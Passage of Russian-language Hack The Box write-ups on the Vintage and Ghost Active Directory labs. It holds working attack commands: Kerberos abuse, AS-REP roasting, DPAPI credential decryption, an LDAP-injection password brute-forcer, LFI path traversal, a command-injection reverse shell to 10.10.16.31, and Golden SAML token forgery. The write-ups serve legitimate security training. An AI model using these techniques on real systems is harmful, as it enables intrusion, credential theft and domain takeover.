воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел 12 открытых портов:
 • 88 — служба Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC). Используется
   для операций взаимодействия контроллер — контроллер и контроллер —
   клиент;
 • 139 — NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.


ТОЧКА ВХОДА

Проверим выданные учетные данные с помощью NetExec.


nxc ldap 10.10.11.45 -u P.Rosa -p Rosaisbest123!



                           Проверка учетных данных

Ответ STATUS_NOT_SUPPORTED говорит о том, что протокол аутентификации
NTLM  не  поддерживается.  Попробуем  использовать  аутентификацию
Kerberos, но сперва обновим запись в файле /etc/hosts.


10.10.11.45 vintage.htb dc01.vintage.htb

Затем необходимо синхронизировать время с сервером.


sudo timedatectl set-ntp false
sudo ntpdate -s 10.10.11.45

Когда все готово, запросим TGT-билет Kerberos для юзера P.Rosa.


getTGT.py vintage.htb/P.Rosa:Rosaisbest123!





                               Получение тикета

Билет получен, теперь используем его для подключения к службе LDAP
с помощью NetExec.


KRB5CCNAME=P.Rosa.ccache nxc ldap dc01.vintage.htb -u P.Rosa -p
'Rosaisbest123!' -k --use-kcache



                               Проверка билета

Все работает, доступ есть, а значит, получим список пользователей с полем
description, ведь иногда там можно найти разную интересную информа‐
цию.


KRB5CCNAME=P.Rosa.ccache nxc ldap dc01.vintage.htb -u P.Rosa -p
'Rosaisbest123!' -k --use-kcache --users





                       Список пользователей домена

Ничего нового не нашли, поэтому соберем базу BloodHound.

Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



Собрать базу можно с помощью BloodHound.py, однако для этого требуется
DNS-сервер. DNS из лаборатории нам недоступен, так что поднимаем
свой — со всеми необходимыми записями.


[A]
*.vintage.htb=10.10.11.45
[SRV]
_ldap._tcp.pdc._msdcs.vintage.htb=0 5 389 vintage.htb
_ldap._tcp.gc._msdcs.vintage.htb=0 5 389 vintage.htb
_kerberos._tcp.dc._msdcs.vintage.htb=0 5 88 vintage.htb

В  качестве  сервера DNS  используем DNSChef. Передаем ему файл
с записями для домена.


python3 dnschef.py --file ./vintage_dns.txt




                               Запуск DNSChef

Когда  сервер DNS  запущен,  указываем  его  в  параметрах  скрипта
BloodHound.


python3 bloodhound.py -u P.Rosa -p 'Rosaisbest123!' -d vintage.htb -k
-c All -dc dc01.vintage.htb -ns 127.0.0.1





                    Сбор данных BloodHound

Загружаем собранную базу в сам BloodHound и анализируем данные. Отме‐
тим, что в группе Pre-Windows 2000 Compatible Access состоит машинная
учетная запись FS01$.





                       Граф BloodHound

Попробуем запросить билет с дефолтным паролем.


getTGT.py 'vintage.htb/FS01$:fs01'





                               Получение тикета

Пароль валидный, а  значит, мы  скомпрометировали еще одну  учетную
запись.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        HTB VINTAGE
        ЛОМАЕМ ЛАБОРАТОРИЮ ACTIVE
                           DIRECTORY





ПРОДВИЖЕНИЕ

Построим граф от только что полученной машинной учетной записи.





                       Граф BloodHound

Учетная запись FS01$ состоит в группе Domain Computers, которая имеет
право ReadGMSAPassword для учетной записи GMSA01$.
   Управляемые учетные записи (MSA) — это специальный тип учетных
записей  Active  Directory, которые можно использовать для безопасного
запуска служб, приложений и заданий планировщика. Основная их идея
в том, что паролем таких  учетных записей полностью управляет  Active
Directory.
  Для них автоматически генерируется сложный пароль длиной 240 сим‐
волов, который меняется автоматически каждые 30 дней. Для аутентифика‐
ции используется только Kerberos, так как интерактивный вход невозможен.
Это связано с тем, что пароль не известен никому и не хранится в локальной
системе,  поэтому его  нельзя извлечь из  системного  процесса LSASS
с помощью Mimikatz.
  Но и такими учетными записями нужно как‑то управлять, а это значит, что,
если у нас есть к ним доступ, мы можем получить хеш пароля. Сделаем это с
помощью bloodyAD.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u 'FS01$' -p 'fs01'
-k get object 'GMSA01$' --attr msDS-ManagedPassword



                  Получение хеша учетной записи GMSA01$

Учетная запись GMSA01$, в свою очередь, имеет право AddSelf для группы
ServiceManagers. Такое право позволяет добавить себя в целевую группу.
Запросим тикет, а затем назначим членство в группе.


getTGT.py 'vintage.htb/GMSA01$' -hashes :
7dc430b95e17ed6f817f69366f35be06





                               Получение тикета


KRB5CCNAME=GMSA01$.ccache bloodyAD --host dc01.vintage.htb -d
vintage.htb -u 'gMSA01$' -k add groupMember 'SERVICEMANAGERS' 'P.
Rosa'



                     Добавление пользователя в группу

Группа ServiceManagers  имеет  право GenericAll на  учетные записи
SVC_LDAP, SVC_SQL и SVC_ARK. Это право дает возможность установить поль‐
зователю любой пароль, но нам лучше узнать существующий.
   Установим для учетных записей флаг DONT_REQ_PREAUTH, который озна‐
чает, что для учетной записи не требуется предварительная проверка под‐
линности Kerberos. Затем проведем атаку AS-REP Roasting для получения
хешей пользователей и их дальнейшего перебора.


             INFO

                        Подробнее  об  атаке  AS-REP  Roasting  читай
                        в  статье  « Базовые  атаки  на  AD.  Разбираем
                          Kerberoasting,  AS-REP   Roasting  и  LLMNR
                         Poisoning».


Активировать флаг DONT_REQ_PREAUTH можно с помощью все  того же
bloodyAD.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u P.Rosa -p
Rosaisbest123! -k add uac SVC_ARK -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d vintage.htb -u P.Rosa -p
Rosaisbest123! -k add uac SVC_SQL -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d vintage.htb -u P.Rosa -p
Rosaisbest123! -k add uac SVC_LDAP -f DONT_REQ_PREAUTH





                   Активация флага DONT_REQ_PREAUTH

А получить хеши — с помощью скрипта GetNPUsers из набора impacket.


GetNPUsers.py -dc-ip dc01.vintage.htb vintage.htb/ -request
-usersfile users.txt -no-pass





                               Получение хешей

Хеш учетной записи SVC_SQL сервер нам не дал, так как учетка отключена.
Воспользуемся bloodyAD, чтобы включить ее.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u P.Rosa -p
Rosaisbest123! -k remove uac SVC_SQL -f ACCOUNTDISABLE



                         Активация учетной записи

Повторно выполним AS-REP Roasting и получим три хеша.





                               Получение хешей

Для брута хешей вида krb5asrep$23 в Hashcat используем режим 18200.
В итоге мне удалось сбрутить пароль той самой учетки svc_sql.


hashcat -m 18200 hashes.txt rockyou.txt



                             Результат перебора хешей

Эта учетка нам пока ничего не дает, а вот ее пароль можно поспреить
по всем остальным учетным записям. Обычно пароли служебных учетных
записей могут  повторяться. Для  быстрого перебора пароля в  службе
Kerberos можно использовать Kerbrute .


kerbrute_linux_amd64 --dc vintage.htb -d vintage.htb passwordspray ./
users.txt Zer0the0ne





                               Результат спрея пароля

Таким способом мы получаем еще одну учетную запись C.NERI и строим
новый граф BloodHound. Пользователь состоит в группе REMOTE MANAGEMENT
USERS, а значит, можно получить сессию на хосте через службу WinRM.





                       Граф BloodHound

Чтобы использовать Kerberos-аутентификацию в Evil-WinRM,  нужно  под‐
готовить файл /etc/krb5.conf.


[libdefaults]
        default_realm = VINTAGE.HTB
[realms]
        VINTAGE.HTB = {
                kdc = DC01.VINTAGE.HTB
        }

Затем получим TGT-билет пользователя c.neri.


getTGT.py vintage.htb/c.neri:Zer0the0ne




                               Получение тикета

А теперь используем полученный билет для авторизации в WinRM.


KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -u c.neri -r
vintage.htb



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Пользователь C.NERI_ADM
Изучаем окружение  пользователя и находим сохраненный блоб данных
DPAPI. Обычно так выглядят сохраненные учетные данные для RDP.


C:\Users\C.Neri\Appdata\roaming\Microsoft\Credentials\
C4BB96844A5C9DD45D5B6A9859252BA6





                    Содержимое каталога Credentials

Скачиваем файл на свой хост и проверяем зашифрованные мастер‑ключи
вот в таком каталоге:


C:\Users\C.Neri\Appdata\roaming\Microsoft\Protect\S-1-5-21-
4024337825-2033394866-2055507597-1115





                 Содержимое каталога с мастер‑ключами

Скачиваем мастер‑ключи DPAPI 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
и 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b на свой хост и расшифровыва‐
ем с помощью impacket-dpapi.


dpapi.py masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-
1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-
1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne





                       Получение мастер‑ключей DPAPI

Теперь с полученными мастер‑ключами пробуем расшифровать блоб.


dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key
0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5
330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key
0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b28
3c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a





                       Расшифровка данных DPAPI

Файл  расшифрован, и мы  получаем  учетные  данные  пользователя c.
neri_adm.


Пользователь L.BIANCHI_ADM
Граф BloodHound показывает, что пользователь C.NERI_ADM состоит в группе
DELEGATEADMINS.





                       Граф BloodHound

В этой же группе состоит и пользователь L.BIANCHI_ADM, который помечен
утилитой как привилегированный объект.





                       Граф BloodHound

Если перестроить граф от пользователя L.BIANCHI_ADM, можно увидеть, что
он является администратором домена.





                       Граф BloodHound

Судя по названию, эта группа должна быть как‑то связана с делегированием,
хотя ни BloodHound, ни impacket-findDelegation ничего не показали. Но если
мы запросим все атрибуты LDAP учетной записи контроллера домена, то уви‐
дим  в  поле  msDs-AllowedToActOnBehalfOfOtherIdentity  SID  группы
DELEGATEADMINS.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u c.neri_adm -p
Uncr4ck4bl3P4ssW0rd0312 -k get object 'DC01$'





                  Информация об учетной записи DC01$

Нам потребуется подконтрольная учетная запись. Так как пользователь C.
NERI_ADM имеет право GenericWrite на группу DELEGATEADMINS, он может
добавлять в нее другие объекты домена, например учетную запись svc_sql.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u c.neri_adm -p
Uncr4ck4bl3P4ssW0rd0312 -k add groupMember "DELEGATEDADMINS"
"svc_sql"


                    Добавление учетной записи в группу

При этом пользователь P.ROSA может установить для этой учетной записи
произвольный SPN.


bloodyAD --host dc01.vintage.htb -d vintage.htb -u P.Rosa -p
Rosaisbest123! -k set object "svc_sql" servicePrincipalName  -v
"cifs/fake"



                            Назначение SPN

Теперь от имени svc_sql запрашиваем тикет для службы CIFS на DC01,
при этом олицетворяем администратора домена L.BIANCHI_ADM.


getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM
-dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'





                            Получение TGS-билета

С полученным билетом TGS авторизуемся в службе WMI от имени поль‐
зователя L.BIANCHI_ADM.


KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
wmiexec.py -k -no-pass vintage.htb/L.BIANCHI_ADM@dc01.vintage.htb





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В  этот раз мы пройдем  путь  от LDAP
Injection  и  LFI  до  Command   Injection
в веб‑приложении. Захватив Linux-машину
в домене, получим пользовательский тикет
Kerberos и проведем DNS Spoofing. После             RalfHacker                                                                                             hackerralf8@gmail.com
получения еще одной  доменной  учетки
скомпрометируем учетную запись службы
ADFS и с помощью техники Golden SAML
сделаем токен для доступа к сайту от имени
админа.


Через связанные серверы Microsoft SQL получим сессию от имени службы,
а затем поднимем привилегии на контроллере дочернего домена. Через
Inter-realm golden ticket скомпрометируем контроллер домена всего леса.
   Наша цель — получение прав суперпользователя на машине Ghost с учеб‐
ной площадки Hack The Box. Уровень сложности задания — «безумный».


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.24 ghost.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел 19 открытых портов:
 • 53 — DNS;
 • 80 (HTTP) — веб‑сервер Microsoft;
 • 88 — Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC). Используется
   для операций взаимодействия контроллер — контроллер и контроллер —
   клиент;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 443 (HTTPS) — веб‑сервер Microsoft IIS/10.0;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 1433 — СУБД Microsoft SQL;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 3389 — служба удаленного рабочего стола;
 • 5985 — служба удаленного управления WinRM;
 • порты 8008 и 8443 — веб‑сервер Nginx 1.18.0;
 • 9389 — веб‑службы AD DS.

Сертификат  веб‑сервиса на  порте 8443  раскрывает новый  поддомен,
который добавим в файл /etc/hosts.


10.10.11.24 ghost.htb core.ghost.htb





                    Главная страница сайта core.ghost.htb

Если перейти к логину через ADFS, получим редирект на новый поддомен.





                         Редирект на новый адрес

Добавляем новый поддомен в /etc/hosts.


10.10.11.24 ghost.htb core.ghost.htb federation.ghost.htb





                    Главная страница federation.ghost.htb

На порте 8008 нас встретит какой‑то блог.





                       Главная страница ghost.htb:8008




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB GHOST
        ПРОБИРАЕМСЯ ЧЕРЕЗ ЛЕС ACTIVE
                           DIRECTORY





ТОЧКА ВХОДА

Так как уже было найдено несколько поддоменов, методом перебора поп‐
робуем найти еще. Для сканирования поддоменов можно использовать ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголовок;
 • -fs — фильтровать страницы по размеру.

Место перебора помечается словом FUZZ.


Задаем все параметры и запускаем:


ffuf -u http://ghost.htb:8008 -H 'Host: FUZZ.ghost.htb:8008' -w dns-
lists.txt -t 128 -fs 7676



                       Результат сканирования поддоменов

Находим еще два домена, которые добавляем в /etc/hosts.


10.10.11.24 ghost.htb core.ghost.htb federation.ghost.htb gitea.
ghost.htb intranet.ghost.htb

На первом нас встречает Gitea, а на втором — страница авторизации.





                             Пользователи Gitea





                   Страница авторизации Intranet Login

Если просмотреть запрос на логин через Burp History, названия парамет‐
ров дадут понять, что используется LDAP-аутентификация.





                         Запрос к странице /login


LDAP Injection
Первым делом проверим инъекцию LDAP, для чего вместо логина и пароля
передадим символ *, который будет воспринят как «любое количество любых
символов». При сравнении с первыми же учетными данными из базы на сто‐
роне сервера аутентификация будет пройдена.





                     Запрос на сервер в Burp Repeater

Повторим вход через браузер и просмотрим, что есть интересного на сайте.





                           Главная страница сайта

На странице Users получаем список всех пользователей.





                             Страница Users

На странице Forum находим интересную информацию. У пользователя недос‐
тупен сервис bitbucket.ghost.htb, так как для него отсутствует запись DNS.
Вернемся  к  этому, как  только получим возможность  создавать записи
на DNS-сервере.





                             Страница Forum

Так как на сайте есть LDAP-инъекция, мы можем попытаться посимвольно
подобрать пароли пользователей. Для первого символа будем подбирать
варианты a*, b*, c* и так далее. Успешный логон означает верно подоб‐
ранный пароль.  Автоматизировать подбор можно следующим скриптом,
а подбирать будем пароль для учетной записи gitea_temp_principal.


import string
import requests


url = 'http://intranet.ghost.htb:8008/login'
headers = {'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940'}


username = "gitea_temp_principal"
password = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        files = {
            '1_ldap-username': (None, username),
            '1_ldap-secret': (None, f'{password}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            password += char
            print(password)
            break
    else:
        break


print()
print(f"Creds =>  {username}:{password}")





                      Подбор пароля пользователя

Пароль успешно подобран, с полученными учетными данными залогинимся
в Gitea.





                           Главная страница Gitea




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB GHOST
        ПРОБИРАЕМСЯ ЧЕРЕЗ ЛЕС ACTIVE
                           DIRECTORY





ТОЧКА ОПОРЫ

LFI
Просмотрим проекты, начиная с репозитория blog. В README написано
про функцию сканирования, которая находится в стадии разработки, поэтому
доступна только с ключом DEV_INTRANET_KEY, который хранится в перемен‐
ной  среды.  Для  доступа  к  API  блога  нужно  использовать  токен
a5af628828958c976a3b6cc81a.





                   README проекта blog

Просмотрим исходный код posts-public.js. Там  интересен  эндпоинт
posts, который в каталоге /var/lib/ghost/extra/ читает файл, переданный
в параметре extra. При этом никакой фильтрации названия файла нет, так
что тут просматривается потенциальная уязвимость LFI.





                    Содержимое файла posts-public.js

Информацию об API удалось найти в официальной справке CMS Ghost.





                          Справка Developer docs

Проверим,  обрабатывается ли URL http://ghost.htb:8008/ghost/api/
content/ на сервере.





                              Тестирование API

Теперь переберем эндпоинты с помощью сканера feroxbuster .
  При запуске укажем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -d — глубина сканирования;
 • -t — количество потоков.


feroxbuster -u http://ghost.htb:8008/ghost/api/content/ -w directory_
2.3_medium_lowercase.txt -d 1 -t 128





                               Результат перебора API

В списке есть нужный нам posts. В запросе к этому API передаем токен,
а также путь к файлу /etc/passwd с обходом каталогов.


http://ghost.htb:8008/ghost/api/content/posts/?
key=a5af628828958c976a3b6cc81a&extra=../../../../../../../../etc/
passwd





                                 Ответ сервера

В ответе сервера получаем содержимое запрошенного файла, а значит, уяз‐
вимость LFI присутствует. Получим переменные окружения, среди которых
должен быть и DEV_INTRANET_KEY.


http://ghost.htb:8008/ghost/api/content/posts/?
key=a5af628828958c976a3b6cc81a&extra=../../../../../../../../proc/
self/environ




                         Переменные окружения

Перейдем ко второму сервису.


Command Injection
В исходном коде сервиса сразу найдем все места, где используется ключ
доступа. Ключ нужно передавать в соответствующем заголовке.





                       Исходный код приложения

Затем среди всех эндпоинтов найдем функцию сканирования. Параметр url
передается в командную оболочку bash без каких‑либо предварительных
проверок.





                       Исходный код функции scan

Попробуем выполнить инъекцию команды id.


curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H
'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/
json' -d '{"url":"q; id"}' | jq





                                 Ответ сервера

Результат выполнения команды есть в ответе сервера, а значит, запускаем
листенер (pwncat-cs -lp 4321) и кидаем реверс‑шелл.


curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H
'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/
json' -d '{"url":"q; sh -i >& /dev/tcp/10.10.16.31/4321 0>&1"}' | jq





                         Сессия пользователя root


Пользователь домена
Теперь нам необходимо собрать информацию. Я, как обычно, буду исполь‐
зовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе много всего, так что нужно пройтись
и выбрать только важную для дальнейшего продвижения информацию.
  В переменных окружения будет несколько паролей. Однако применить их
негде.





                         Переменные окружения

В домашнем каталоге рута есть SSH-конфиг для пользователя florence.
ramirez.





                  Содержимое домашнего каталога root

Осталось просто подключиться к хосту dev-workstation.




                   Сессия пользователя florence.ramirez




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB GHOST
        ПРОБИРАЕМСЯ ЧЕРЕЗ ЛЕС ACTIVE
                           DIRECTORY





ДОЧЕРНИЙ ДОМЕН

DNS Spoofing
Так как мы работаем в контексте доменного пользователя, сразу проверим
настройки Kerberos в файле /etc/krb5.conf. Создадим соответствующие
записи в файле /etc/hosts.





                    Содержимое файла /etc/krb5.conf

Имея пользователя домена, попробуем провернуть  атаку DNS Spoofing.
Для этого на своей машине запустим листенер:


responder -i tun0

Теперь создадим запись для имени bitbucket.ghost.htb. Для этого сдам‐
пим тикет пользователя и перенесем на свою машину.





                        Перенос билета Kerberos

Декодировав тикет обратно на своей машине, выполним его проверку через
NetExec.


KRB5CCNAME=florence.ramirez.ccache nxc smb dc01.ghost.htb -d ghost.
htb -u florence.ramirez -k --use-kcache



                               Проверка билета

Аутентификация пройдена, а значит, с билетом все в порядке. Осталось
с помощью dnstool.py создать DNS-запись bitbucket.ghost.htb, которая
будет резолвиться в адрес нашей машины с респондером.


KRB5CCNAME=florence.ramirez.ccache python3 dnstool.py -u 'GHOST.HTB\
florence.ramirez' -k -r bitbucket.ghost.htb -a add -d 10.10.16.31
-dns-ip 10.10.11.24 DC01.GHOST.HTB




                         Создание DNS-записи

Теперь, когда пользователь обратится к машине bitbucket, он пройдет
аутентификацию на нашем сервере. Так мы и получаем NTLMv2-хеш учетной
записи justin.bradley.





                                Логи респондера

Сломать этот хеш труда не составило, пароль оказался словарным.


hashcat -m 5600 'justin.bradley::ghost:edb4330302715a...0000000'
rockyou.txt





                             Результат подбора пароля

От имени нового пользователя подключаемся к WinRM и забираем первый
флаг.


evil-winrm -u justin.bradley -p 'Qwertyuiop1234$$' -i 10.10.11.24





                       Флаг пользователя


ADFS
Теперь,  когда  у нас  есть  валидная  учетная  запись, соберем  данные
для BloodHound c помощью скрипта на Python. Скрипт требует указать DNS-
сервер, а так как в этой лабе он недоступен, развернем свой с помощью ути‐
литы DNSChef. Первым делом создадим для нее конфиг.


[A]
*.ghost.htb=10.10.11.24
[SRV]
_ldap._tcp.pdc._msdcs.ghost.htb=0 5 389 ghost.htb
_ldap._tcp.gc._msdcs.ghost.htb=0 5 389 ghost.htb
_kerberos._tcp.dc._msdcs.ghost.htb=0 5 88 ghost.htb

Затем передаем его в DNSChef и запускаем коллектор BloodHound.


python3 dnschef.py --file ghost_dns.txt


python3 bloodhound.py -d ghost.htb -u justin.bradley -p
'Qwertyuiop1234$$' -c All -ns 127.0.0.1 --use-ldap --zip





                                 Логи DNSChef





                          Логи коллектора BloodHound

Теперь строим графы BloodHound от скомпрометированных пользователей.
У пользователя justin.bradley есть право ReadGMSAPassword на объект
ADFS_GMSA$.





                       Граф BloodHound


Управляемые учетные записи Active Directory
Управляемые учетные записи (MSA) — это специальный тип учетных записей
Active Directory, которые можно использовать для безопасного запуска служб,
приложений и заданий планировщика. Основная их идея в том, что паролем
полностью управляет Active Directory.
  Для  таких  учеток  автоматически  генерируется сложный пароль  дли‐
ной 240  символов, который  меняется  автоматически каждые 30 дней.
Для аутентификации используется только Kerberos, так как интерактивный
вход невозможен. Это связано с тем, что пароль не известен никому и не хра‐
нится в локальной системе, поэтому его нельзя извлечь из системного про‐
цесса LSASS с помощью Mimikatz.
  Но и такими учетными записями нужно как‑то управлять, а это значит, что,
если у нас есть к ним доступ, мы можем получить хеш пароля. Сделаем это с
помощью NetExec.


nxc ldap 10.10.11.24 -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa




                 Получение хеша учетной записи adfs_gmsa$

У нас есть хеш пароля учетной записи adfs_gmsa$, который позволяет авто‐
ризоваться по WinRM.


evil-winrm -u 'adfs_gmsa$' -H d85668e5ce1d81853cac52625fcfd530 -i 10.
10.11.24





                       Информация о пользователе


Golden SAML
ADFS — это функция Active Directory, которая обеспечивает идентификацию
доступа и дает возможность клиентам (в основном на базе браузеров),
которые находятся внутри или за пределами локальной сети, получать доступ
к веб‑приложениям по технологии Single-Sign-On (SSO). Так ADFS извлекает
атрибуты пользователей из Active Directory, а также проверяет подлинность
пользователей в AD.
   Служба федерации ADFS — компонент серверной платформы Microsoft
Windows Server. Она реализует сервис маркеров доступа (STS), который
использует службу каталога Active Directory для аутентификации пользовате‐
лей и хранения информации о них.
   Основные операции:
 • первоначальная аутентификация пользователя;
 • выпуск маркера доступа (Issue);
 • проверка маркера доступа (Validate);
 • обновление маркера доступа (Renew);
 • аннулирование маркера доступа (Cancel).

Маркер доступа выпускается по факту успешной аутентификации и достовер‐
но идентифицирует пользователя приложения. Для получения маркера дос‐
тупа пользователь предоставляет учетные данные AD либо свой сертификат.
   Маркер доступа соответствует спецификации SAML Token, которая опре‐
деляет синтаксис и структуру маркера. Это расширяемый формат, что поз‐
воляет формировать содержание маркера в соответствии с требованиями
приложения, к которому осуществляется доступ. Срок действия маркера
и область применения ограничены. Маркер доступа содержит информацию
о пользователе в форме набора утверждений (Claims), которые используются
приложением для создания контекста пользователя.
  При компрометации учетной записи службы ADFS на сервере ADFS воз‐
можно провести атаку Golden SAML. Суть атаки в том, что после получения
приватных данных ADFS, которые используются для создания SAMLResponce,
атакующий может самостоятельно генерировать SAMLResponce для любых
пользователей и сервисов.
  Для этого с помощью ADFSDump нужно получить следующие данные:
 • сертификат подписи токена и его закрытый ключ;
 • ключ диспетчера распределенных ключей (DKM) из Active Directory;
 • список служб, для которых сервер ADFS настроен в качестве поставщика
   удостоверений.


.\ADFSDump.exe





                             Данные ADFS

Полученные Private Key и Token Signing Key необходимо декодировать.


cat pk.txt | tr -d "-" | xxd -r -p > pk.bin
cat tsk.txt | base64 -d > tsk.bin

Затем используем ADFSpoof, чтобы сгенерировать SAMLResponse поль‐
зователя на имя юзера Administrator@ghost.htb и сервиса core.ghost.
htb.


python3 ADFSpoof.py -b tsk.bin pk.bin -s 'core.ghost.htb' saml2
--endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse'
--nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:
emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier
'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://
schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>
Administrator@ghost.htb</AttributeValue></Attribute><Attribute
Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>
Administrator</AttributeValue></Attribute>'





                          Получение SAMLResponse

Следом выполняем и перехватываем через Burp Proxy запрос к сервису
https://core.ghost.htb/adfs/saml/postResponse, изменяем метод с GET
на POST и вставляем данные SAMLResponse.





                      Запрос к серверу core.ghost.htb

Отправляем данный запрос на сервер и в браузере видим страницу Ghost
Config Panel.





                    Главная страница сайта core.ghost.htb


Microsoft SQL Server
Никаких привилегий у текущего пользователя базы данных нет. Олицет‐
ворения тоже не  настроены. Однако в домене есть связанный сервер
PRIMARY, найти который можно следующим запросом.


EXEC sp_linkedservers;





                    Информация о связанных серверах

Теперь нужно проверить привилегии пользователя базы данных и настройки
олицетворения на связанном сервере. Следующим запросом можно опре‐
делить, что мы можем выполнять команды на связанном сервере PRIMARY
от имени административной учетной записи sa.


EXECUTE('SELECT distinct b.name FROM sys.server_permissions a INNER
JOIN sys.server_principals b ON a.grantor_principal_id = b.
